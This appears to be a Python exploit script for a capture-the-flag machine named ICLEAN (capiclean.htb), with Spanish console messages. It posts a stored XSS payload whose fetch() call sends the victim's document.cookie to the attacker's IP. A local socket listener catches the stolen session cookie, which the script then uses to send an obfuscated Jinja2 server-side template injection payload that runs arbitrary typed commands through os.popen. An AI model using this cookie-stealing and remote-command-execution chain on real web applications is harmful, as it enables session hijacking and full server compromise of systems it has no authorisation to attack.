#!/usr/bin/env python3

import requests
import sys
import re
import socket
import signal
from termcolor import colored
from urllib.parse import quote
from http.server import BaseHTTPRequestHandler, HTTPServer

miIP = "10.10.16.9"
headers = {
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
}

def def_handler(sig, frame):
    print(colored(f"\n[!] Saliendo...\n", 'red'))
    sys.exit(1)
signal.signal(signal.SIGINT, def_handler)

def serverPY():
    host = ''
    port = 80
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind((host, port))
        s.listen(1)
        print(colored(f"\n\t[+] Server Python: ", 'blue'))
        conn, addr = s.accept()
        print(f"\t\t- Conexión: {addr}, Cookie Recibida")
        received_data = b""
        while True:
            data = conn.recv(1024)
            if not data:
                break
            received_data += data
        decoded_data = received_data.decode('utf-8')
        session_index = decoded_data.find('session=')
        if session_index != -1:
            session_content = decoded_data[session_index + len('session='):]
            cookieRC = session_content.split()[0]
            print(f'\t\t- Cookie: {cookieRC}')
        return cookieRC

def exCookie():
    urlCookie = "http://capiclean.htb/sendMessage"
    data = {
        'service' : f'<img src=x onerror=fetch("http://{miIP}/"+document.cookie);>',
        'email' : 'test@test.com',
    }
    r = requests.post(urlCookie, headers=headers, data=data)

def sttiPost(cookieRC, headers):
    while True:
        command = input(colored("\n\t[+] Command -> ", 'blue'))
        url = 'http://capiclean.htb/QRGenerator'

        cookies = {
            'session': f"{cookieRC}"
        }
        data = {
            'invoice_id': '',
            'form_type': 'scannable_invoice',
            'qr_link': '{{request|attr(\'application\')|attr(\'\\x5f\\x5fglobals\\x5f\\x5f\')|attr(\'\\x5f\\x5fgetitem\\x5f\\x5f\')(\'\\x5f\\x5fbuiltins\\x5f\\x5f\')|attr(\'\\x5f\\x5fgetitem\\x5f\\x5f\')(\'\\x5f\\x5fimport\\x5f\\x5f\')(\'os\')|attr(\'popen\')(\'id\')|attr(\'read\')()}}'.replace('id', command)
        }
        response = requests.post(url, headers=headers, cookies=cookies, data=data)
        response_text = response.text
        filterResponse = re.search(r'<div class="qr-code-container">.*?<img src="(data:image\/png;base64,.*?)".*?>', response_text, re.DOTALL)
        filterClean = filterResponse.group(1)
        match = filterClean.replace("data:image/png;base64,", "")
        if match:
            print("\t\t $>", match) 
        else:
            print("No se encontró el código de la imagen base64.")
        continue

def main():
    print(colored(f"\n[+] Este script se aprovecha de la vulnerabilidad XSS y SSTI en la máquina ICLEAN", 'green'))
    exCookie()
    cookie_rc = serverPY()
    sttiPost(cookie_rc, headers)

if __name__ == '__main__':
    main()
